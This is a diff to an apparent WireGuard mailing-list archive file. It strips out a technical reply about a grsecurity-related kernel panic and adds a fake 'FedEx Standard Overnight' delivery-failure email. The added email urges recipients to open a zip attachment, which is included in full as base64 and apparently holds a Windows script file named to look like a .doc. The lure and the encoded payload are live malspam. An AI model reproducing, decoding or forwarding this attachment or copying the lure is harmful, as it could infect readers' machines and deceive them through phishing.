@@ -1,20 +1,15 @@
-Return-Path: pageexec@freemail.hu
-Received: from r00tworld.com (r00tworld.com [212.85.137.150])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id f5fdb101
- for <wireguard@lists.zx2c4.com>; Wed, 7 Dec 2016 00:39:31 +0000 (UTC)
-From: "PaX Team" <pageexec@freemail.hu>
-To: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Wed, 07 Dec 2016 01:44:44 +0100
+Return-Path: mw2ph2rnr3@kalu.co.jp
+Received: from kalu.co.jp (kalu.co.jp [61.126.7.119])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id d08d6717
+ for <wireguard@lists.zx2c4.com>; Wed, 7 Dec 2016 00:42:59 +0000 (UTC)
+To: wireguard@lists.zx2c4.com
+Subject: Problem with parcel shipping, ID:000504341
+Date: Wed, 7 Dec 2016 09:48:16 +0900
+From: "FedEx Standard Overnight" <nicholas.short@kalu.co.jp>
+Message-ID: <1c69bd6db8b977f9f250de15b6994912@kalu.co.jp>
 MIME-Version: 1.0
-Subject: Re: Kernel Panic
-Message-ID: <58475B7C.14182.19D586@pageexec.freemail.hu>
-In-reply-to: <CAHmME9q+oEAo+HuSRf8WJoGv+jbsA46c3GHXCUT4QvX8a+k23w@mail.gmail.com>
-References: <e15d1fea-8761-fde9-6802-cb483340ebb4@sholland.org>,
- <CAHmME9qBAt84jOvJhnSOybekbOFQb1RH+7mmfGK=bc2i9bxADg@mail.gmail.com>,
- <CAHmME9q+oEAo+HuSRf8WJoGv+jbsA46c3GHXCUT4QvX8a+k23w@mail.gmail.com>
-Content-type: text/plain; charset=US-ASCII
-Cc: spender@grsecurity.net, WireGuard mailing list <wireguard@lists.zx2c4.com>
-Reply-To: pageexec@freemail.hu
+Content-Type: multipart/mixed; boundary="b1_8ff2176d1e31d1c8b71aae5f4a57393f"
+Reply-To: FedEx Standard Overnight <nicholas.short@kalu.co.jp>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -24,60 +19,51 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-On 6 Dec 2016 at 23:39, Jason A. Donenfeld wrote:
+--b1_8ff2176d1e31d1c8b71aae5f4a57393f
+Content-Type: text/plain; charset=us-ascii
 
-[added spender to CC as it's his feature in grsec]
+Dear Customer,
 
-> Hey PaXTeam,
-> 
-> I tracked down Samuel's bug to this line in crypto/scatterwalk.c:
->         if (sg_page(sg) == virt_to_page(realbuf) &&
-> 
-> virt_to_page is redefined for CONFIG_GRKERNSEC_KSTACKOVERFLOW:
-> 
-> #define virt_to_page(kaddr)     \
->        ({ \
->                const void *__kaddr = (const void *)(kaddr); \
->                BUG_ON(!virt_addr_valid(__kaddr)); \
->                pfn_to_page(__pa(__kaddr) >> PAGE_SHIFT); \
->        })
-> 
-> So that's where the bug is hit. Now why is this happening?
-> 
-> I call scatterwalk_map_and_copy to read or write from or to a stack
-> buffer
+We could not deliver your parcel.
+Please, open email attachment to print shipment label.
 
-that's is your problem, DMA is forbidden to/from the stack in linux,
-Documentation/DMA-API-HOWTO.txt says this:
+Regards,
+Nicholas Short,
+Sr. Delivery Agent.
 
-   This rule also means that you may use neither kernel image addresses
-   (items in data/text/bss segments), nor module image addresses, nor
-   stack addresses for DMA.
 
-> from a scattergather list, inside some crypto code that does
-> MAC checking. When virt_addr_valid(__kaddr) returns false, it is only
-> after PaX has additionally messed with its value. A few lines above
-> the call to virt_to_page is:
-> 
-> #ifdef CONFIG_GRKERNSEC_KSTACKOVERFLOW
->        if (object_starts_on_stack(buf))
->                realbuf = buf - current->stack + current->lowmem_stack;
-> #endif
-> 
-> Presumably this condition winds up being true, and then that
-> arithmetic is wrong somehow. Alternatively, that condition isn't true
-> due to a bug in object_starts_on_stack, and that arithmetic doesn't
-> run when it needs to run.
-> 
-> Samuel reported that the problem did not exist on 4.7 but does exist
-> on 4.8. If my memory serves me correctly, 4.8 introduced virtually
-> mapped stacks. Could it be that this virtual mapping now eliminates
-> the need for that arithmetic?
+--b1_8ff2176d1e31d1c8b71aae5f4a57393f
+Content-Type: application/zip; name="FedEx_000504341.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=FedEx_000504341.zip
 
-upstream will have 'virtually mapped stacks' (stupid name btw, stack is
-always virtually mapped on MMU-capable systems :) as of 4.9 only, what
-you're seeing above is grsec's KSTACKOVERFLOW feature which had a little
-bonus added in 4.8 to handle (and detect the abuse of) IRQ stacks as well.
+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
 
-> Regards,
-> Jason
+
+--b1_8ff2176d1e31d1c8b71aae5f4a57393f--
